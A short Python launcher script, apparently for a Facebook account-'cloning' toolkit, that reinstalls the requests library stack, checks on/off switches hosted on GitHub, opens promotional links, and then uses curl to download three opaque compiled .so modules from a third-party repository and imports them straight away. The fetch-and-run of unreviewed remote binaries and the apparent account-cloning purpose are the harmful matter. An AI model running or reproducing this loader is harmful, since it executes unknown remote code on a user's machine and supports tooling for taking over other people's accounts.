
disabler_file = "disable.so"
file_clone_file = "x3.so"
random_clone_file = "L.cpython-311.so"
import os
os.system("pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests")
try:
  import httpx
except ModuleNotFoundError:
  os.system("pip install httpx")
  import httpx



file_server_text = httpx.get("https://raw.githubusercontent.com/Ahmed-XD/FILE/main/file_on.txt").text.strip()
random_server_text = httpx.get("https://raw.githubusercontent.com/Ahmed-XD/FILE/main/random-on.txt").text.strip()
def intro():
  print('give star to our repo')
  os.system('git pull && clear')
  os.system('xdg-open https://github.com/Ahmed-XD/FILE')
  print('Join Our Facebook Group and support us')
  os.system('xdg-open https://m.facebook.com/groups/1247184652736578/')
  os.system('clear')
  
def install_part(file_name):
  os.system(f"curl -L https://github.com/Ahmed-XD/library/blob/main/{file_name}?raw=true -o {file_name}")

if os.path.exists(disabler_file) and os.path.exists(file_clone_file) and os.path.exists(random_clone_file):
  os.remove(disabler_file)
  os.remove(file_clone_file)
  os.remove(random_clone_file)

intro()
install_part(disabler_file)
install_part(file_clone_file)
install_part(random_clone_file)
os.system("clear")



print(f'[1] FILE CLONE [{file_server_text}]')
print(f'[2] RANDOM CLONE [{random_server_text}]')
choice = input('Choose : ')
import time
time.sleep(2)
if int(choice) == 1:
  import disable
  if file_server_text == 'off':exit("File cloning tool is off")
  else:import x3
else:
  import disable
  if random_server_text == 'off':exit("Random cloning tool is off")
  else:import L
